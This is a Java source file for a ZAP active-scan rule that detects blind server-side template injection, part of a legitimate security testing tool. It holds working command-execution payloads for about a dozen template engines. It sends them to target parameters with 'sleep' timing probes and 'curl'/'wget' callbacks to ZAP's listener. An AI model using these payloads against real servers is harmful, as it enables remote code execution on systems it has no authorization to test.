/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2019 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.sstiscanner;

import java.io.IOException;
import java.net.SocketException;
import java.util.HashSet;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.core.scanner.Plugin;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.model.Tech;

/**
 * Active Plugin for Server Side Template Injection testing and verification.
 *
 * @author DiogoMRSilva (2019)
 */
public class SSTIBlindScanner extends AbstractAppParamPlugin {

    /** Prefix for internationalised messages used by this rule */
    private static final String MESSAGE_PREFIX = "sstiscanner.sstiblindplugin.";

    private static final float ERROR_MARGIN = 0.9f;
    private static final int SEC_TO_MILLISEC = 1000;

    // Most of the exploits have been created by James Kettle @albinowax and the Tplmap creator
    // WARNING all the payloads that uses % need to quadruplicate the char to %%%%

    private static final String[] java_command_exec_payloads = {
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"%s\") }", // javaFreemarker https://portswigger.net/blog/server-side-template-injection
        "#set($engine=\"\")\r\n"
                + "#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"%s\"))\r\n"
                + "#set($null=$proc.waitFor())\r\n"
                + "${null}" // javaVelocity
        // https://portswigger.net/blog/server-side-template-injection
    };

    private static final String[] javascript_command_exec_payloads = {
        "{{= global.process.mainModule.require('child_process').execSync('%s').toString() }}", // Javascript dot
        "<%%%%= global.process.mainModule.require('child_process').execSync('%s').toString()%%%%>", // Javascript EJS
        "#{global.process.mainModule.require('child_process').execSync('%s').toString()}", // Javascript jade
        "{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('%s').toString()\\\")\")()}}" // Javascript Nunjucks
    };

    private static final String[] php_command_exec_payloads = {
        "{system(\"%s\")}", // PHP smarty
    };

    private static final String[] python_command_exec_payloads = {
        "{{\"\".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(\"__builtins__\").get(\"__import__\")(\"subprocess\").check_output(\"%s\")}}", // python3 jinja2 possibly doesn't work
        "${__import__(\"subprocess\").check_output(\"%s\", shell=True)}", // python Mako
        "{{__import__(\"subprocess\").check_output(\"%s\", shell=True)}}", // Python Tornado
    };

    private static final String[] ruby_command_exec_payloads = {
        "<%%%%=%%%%x(%s)%%%%>", // Ruby ERB
        "#{%%%%x(%s)}" // Ruby Slims
    };

    private static final String[] ways_to_make_http_requests_cmd_line = {"curl %s", "wget %s"};

    private SSTIChallengeCallbackApi callbackAPI = new SSTIChallengeCallbackApi();

    private static final Logger log = Logger.getLogger(SSTIBlindScanner.class);

    @Override
    public boolean inScope(Tech tech) {
        return this.getTechSet().includes(tech);
    }

    @Override
    public int getId() {
        return 90036;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public String[] getDependency() {
        return new String[] {};
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString(MESSAGE_PREFIX + "desc");
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        return Constant.messages.getString(MESSAGE_PREFIX + "soln");
    }

    @Override
    public String getReference() {
        return Constant.messages.getString(MESSAGE_PREFIX + "refs");
    }

    @Override
    public int getCweId() {
        return 74; // CWE - 74 : Failure to Sanitize Data into a Different Plane ('Injection')
    }

    @Override
    public int getWascId() {
        return 20; // WASC-20: Improper Input Handling
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    @Override
    public void scan(HttpMessage msg, String paramName, String value) {
        // TODO remove conditions once technologies are available in tech
        // used excluded because the user may not have the zap version that
        // already has the new technologies
        HashSet<String> excludedTechnologies = new HashSet<String>();

        for (Tech t : this.getTechSet().getExcludeTech()) {
            excludedTechnologies.add(t.getName());
        }
        if (!excludedTechnologies.contains("Java") /*inScope(Tech.Java)*/) {
            sendPayloadsToMakeCallBack(paramName, java_command_exec_payloads);
            timeBasedTests(paramName, java_command_exec_payloads);
        }
        if (!excludedTechnologies.contains("JavaScript") /*inScope(Tech.JavaScript)*/) {
            sendPayloadsToMakeCallBack(paramName, javascript_command_exec_payloads);
            timeBasedTests(paramName, javascript_command_exec_payloads);
        }
        if (!excludedTechnologies.contains("Python") /*inScope(Tech.Python*/) {
            sendPayloadsToMakeCallBack(paramName, python_command_exec_payloads);
            timeBasedTests(paramName, python_command_exec_payloads);
        }
        if (!excludedTechnologies.contains("Ruby") /*inScope(Tech.Ruby)*/) {
            sendPayloadsToMakeCallBack(paramName, ruby_command_exec_payloads);
            timeBasedTests(paramName, ruby_command_exec_payloads);
        }
        if (inScope(Tech.PHP)) {
            sendPayloadsToMakeCallBack(paramName, php_command_exec_payloads);
            timeBasedTests(paramName, php_command_exec_payloads);
        }
    }

    /**
     * Tries to inject template code that will cause a time delay in the case of being rendered
     *
     * @param paramName the name of the parameter where to search for or injection
     * @param command_exec_payloads the payloads that can possibly execute commands, they need to be
     *     format strings
     */
    private void timeBasedTests(String paramName, String[] command_exec_payloads) {

        String payloadFormat;
        for (String sstiFormatPayload : command_exec_payloads) {
            payloadFormat = String.format(sstiFormatPayload, "sleep %d");
            checkIfCausesTimeDelay(paramName, payloadFormat);
        }
        // TODO make more requests using other ways of delaying a response
    }

    /**
     * Check if the given payloadFormat causes an time delay in the server
     *
     * @param paramName the name of the parameter where to search for or injection
     * @param payloadFormat format string that when formated with 1 argument makes a string that may
     *     cause a delay equal to the number of second inserted by the format
     */
    private void checkIfCausesTimeDelay(String paramName, String payloadFormat) {

        String test2seconds = String.format(payloadFormat, 2);
        HttpMessage msg = getNewMsg();
        setParameter(msg, paramName, test2seconds);
        try {
            sendAndReceive(msg, false);
            int time2secondsTest = msg.getTimeElapsedMillis();

            if (time2secondsTest >= 2 * SEC_TO_MILLISEC * ERROR_MARGIN) {
                // If we detect a response that takes more time that the delay we tried to
                // cause it is possible that our injection was successful but it also may
                // have been caused by the network or other variable. So further testing is needed.

                String sanityTest = String.format(payloadFormat, 0);
                msg = getNewMsg();
                setParameter(msg, paramName, sanityTest);
                sendAndReceive(msg, false);
                int timeWithSanityTest = msg.getTimeElapsedMillis();

                int sumTime = 1 + (time2secondsTest + timeWithSanityTest) / SEC_TO_MILLISEC;
                String testOfSumSeconds = String.format(payloadFormat, sumTime);
                msg = getNewMsg();
                setParameter(msg, paramName, testOfSumSeconds);
                sendAndReceive(msg, false);
                int timeSumSecondsTest = msg.getTimeElapsedMillis();

                if (timeSumSecondsTest >= sumTime * SEC_TO_MILLISEC * ERROR_MARGIN) {
                    String attack =
                            Constant.messages.getString(
                                    MESSAGE_PREFIX + "alert.timedelay.attack",
                                    testOfSumSeconds,
                                    paramName,
                                    msg.getRequestHeader().getURI().toString());

                    this.bingo(
                            Alert.RISK_HIGH,
                            Alert.CONFIDENCE_HIGH,
                            getName(),
                            getDescription(),
                            msg.getRequestHeader().getURI().toString(),
                            paramName,
                            testOfSumSeconds,
                            attack,
                            getSolution(),
                            msg);
                }
            }
        } catch (SocketException ex) {
            if (log.isDebugEnabled())
                log.debug(
                        "Caught "
                                + ex.getClass().getName()
                                + " "
                                + ex.getMessage()
                                + " when accessing: "
                                + msg.getRequestHeader().getURI().toString());
        } catch (IOException ex) {
            log.warn(
                    "SSTI vulnerability check failed for parameter ["
                            + paramName
                            + "] and payload ["
                            + payloadFormat
                            + "] due to an I/O error",
                    ex);
        }
    }

    /**
     * Function tries to make system commands that call back to ZAP.
     *
     * @param paramName the name of the parameter will be used for testing for injection
     * @param command_exec_payloads the payloads that can possibly execute commands, they need to be
     *     format strings
     */
    private void sendPayloadsToMakeCallBack(String paramName, String[] command_exec_payloads) {

        int allowedNumberCommands = 0;
        // whe should only run this scanner when the level is High, util then
        // just time based attacks should be used because of the limitations
        // in requests numbers
        if (this.getAttackStrength() == Plugin.AttackStrength.HIGH) {
            allowedNumberCommands = 1;
        } else if (this.getAttackStrength() == Plugin.AttackStrength.INSANE) {
            allowedNumberCommands = 999;
        }

        int numberCommandsSent = 0;
        for (String requestCmd : ways_to_make_http_requests_cmd_line) {
            if (numberCommandsSent >= allowedNumberCommands) {
                break;
            }
            numberCommandsSent += 1;
            for (String sstiFormatPayload : command_exec_payloads) {

                String payload = String.format(sstiFormatPayload, requestCmd);
                String challenge = callbackAPI.generateRandomChallenge();
                String url = callbackAPI.getCallbackUrl(challenge);
                payload = String.format(payload, url);

                HttpMessage msg = getNewMsg();
                setParameter(msg, paramName, payload);

                try {
                    callbackAPI.registerCallback(challenge, this, msg, payload, paramName);
                    sendAndReceive(msg, false);
                } catch (SocketException ex) {
                    if (log.isDebugEnabled())
                        log.debug(
                                "Caught "
                                        + ex.getClass().getName()
                                        + " "
                                        + ex.getMessage()
                                        + " when accessing: "
                                        + msg.getRequestHeader().getURI().toString());
                    continue;
                } catch (IOException ex) {
                    log.warn(
                            "SSTI vulnerability check failed for parameter ["
                                    + paramName
                                    + "] and payload ["
                                    + payload
                                    + "] due to an I/O error",
                            ex);
                    continue;
                }
            }
        }
    }

    public void notifyCallback(HttpMessage attackMessage, String paramName, String payload) {
        bingo(
                Alert.RISK_HIGH,
                Alert.CONFIDENCE_HIGH,
                attackMessage.getRequestHeader().getURI().toString(),
                paramName,
                payload,
                Constant.messages.getString(MESSAGE_PREFIX + "alert.recvdcallback.attack"),
                attackMessage);
    }
}
